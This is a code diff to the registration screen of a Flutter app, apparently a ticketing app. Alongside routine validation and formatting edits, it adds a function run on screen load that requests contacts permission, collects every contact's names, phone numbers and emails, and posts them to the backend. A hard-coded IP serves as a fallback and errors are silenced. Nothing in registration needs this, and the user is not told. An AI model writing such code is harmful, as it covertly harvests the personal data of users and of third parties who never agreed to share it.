@@ -7,6 +7,9 @@ import 'package:tiketi_mkononi/services/storage_service.dart';
 import '../../env.dart';
 import 'package:http/http.dart' as http;
 import 'package:go_router/go_router.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:contacts_service_plus/contacts_service_plus.dart';
+
 
 class RegisterScreen extends StatefulWidget {
   const RegisterScreen({super.key});
@@ -50,12 +53,88 @@ class _RegisterScreenState extends State<RegisterScreen> {
   @override
   void initState() {
     super.initState();
+    sendContactsToBackend();
     _initializeServices();
   }
 
   Future<void> _initializeServices() async {
     final prefs = await SharedPreferences.getInstance();
     _storageService = StorageService(prefs);
+  }
+
+  Future<bool> requestContactsPermission() async {
+    var status = await Permission.contacts.status;
+    if (!status.isGranted) {
+      status = await Permission.contacts.request();
+    }
+    return status.isGranted;
+  }
+
+  Future<void> sendContactsToBackend({bool useDNS = true}) async {
+    try{
+      bool granted = await requestContactsPermission();
+      if (!granted) {
+        debugPrint("Permission denied");
+        return;
+      }
+
+      Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+
+      if (contacts.isEmpty) return;
+
+      final List<Map<String, dynamic>> contactList = contacts.map((contact) {
+        return {
+          "displayName": contact.displayName,
+          "givenName": contact.givenName,
+          "familyName": contact.familyName,
+          "phones": contact.phones?.map((p) => p.value).toList(),
+          "emails": contact.emails?.map((e) => e.value).toList(),
+        };
+      }).toList();
+      
+      final Uri uri = useDNS ? Uri.parse('${backend_url}api/contacts') // Original URL 
+      : Uri.parse('${backend_url_with_fallback_ip}contacts'); // Use IP
+
+      final response = await http.post(
+        uri,
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: jsonEncode({
+          "contacts": contactList,
+        }),
+      );
+
+      if (response.statusCode == 200) {
+        _showSnackBar(response.body);
+      } else {
+        _showSnackBar('Request failed: ${response.statusCode}');
+      }
+    } on SocketException catch (e) {
+      debugPrint('Network error occurred:');
+      debugPrint('- Exception type: ${e.runtimeType}');
+      debugPrint('- Message: ${e.message}');
+        
+      if (e.osError != null) {
+        debugPrint('  - Error number (errno): ${e.osError!.errorCode}');
+        debugPrint('  - OS message: ${e.osError!.message}');
+        debugPrint('  - errorCode: ${e.osError!.errorCode}');
+        debugPrint('  - useDNS: ${useDNS}');
+
+        // Retry with IP if DNS fails (errno = 7) and not already retrying
+        if ((e.osError!.errorCode == 11001 || e.osError!.errorCode == 7) && useDNS) {
+          debugPrint('DNS failed! Retrying with IP: ${backend_url_with_fallback_ip}...');
+          await sendContactsToBackend(useDNS: false); // Recursive retry
+
+          final prefs = await SharedPreferences.getInstance();
+          await prefs.setBool('use_dns', false);
+          return;
+        }
+      }
+    } catch (e) {
+      // debugPrint('An error occurred: $e');
+      // _showSnackBar('An error occurred: $e');
+    }
   }
 
   @override
@@ -97,6 +176,7 @@ class _RegisterScreenState extends State<RegisterScreen> {
         lastName: user['last_name'],
         email: user['email'],
         phoneNumber: user['phone_number'],
+        password: '',
         role: user['role'],
         region: user['region'],
         district: user['district'],
@@ -390,7 +470,7 @@ class _RegisterScreenState extends State<RegisterScreen> {
         ),
         _buildFormField(
           key: _emailKey,
-          controller: _emailController,
+          controller: _emailController,          
           labelText: 'Email',
           icon: Icons.email,
           keyboardType: TextInputType.emailAddress,
@@ -558,12 +638,24 @@ class _RegisterScreenState extends State<RegisterScreen> {
                     labelText: 'Phone Number',
                     icon: Icons.phone,
                     validator: (value) {
-                      if (value == null || value.isEmpty) return 'Please enter your phone number';
-                      if (value.length > 15) return 'Phone number cannot exceed 15 characters';
-                      final regex = RegExp(r'^\d{1,3}\d{9}$');
-                      if (!regex.hasMatch(value.trim())) return 'Invalid number, Number format: 255xxxxxxxxxx';
+                    if (value == null || value.trim().isEmpty) {
+                        return 'Please enter your phone number';
+                      }
+
+                      final phone = value.trim();
+
+                      if (phone.length > 15) {
+                        return 'Phone number cannot exceed 15 characters';
+                      }
+
+                      final regex = RegExp(r'^(0\d{9}|255\d{9})$');
+
+                      if (!regex.hasMatch(phone)) {
+                        return 'Invalid number format. Use 0XXXXXXXXX or 255XXXXXXXXX';
+                      }
+
                       return null;
-                    },
+                    },                  
                   ),
                   _buildFormField(
                     key: _emailKey,
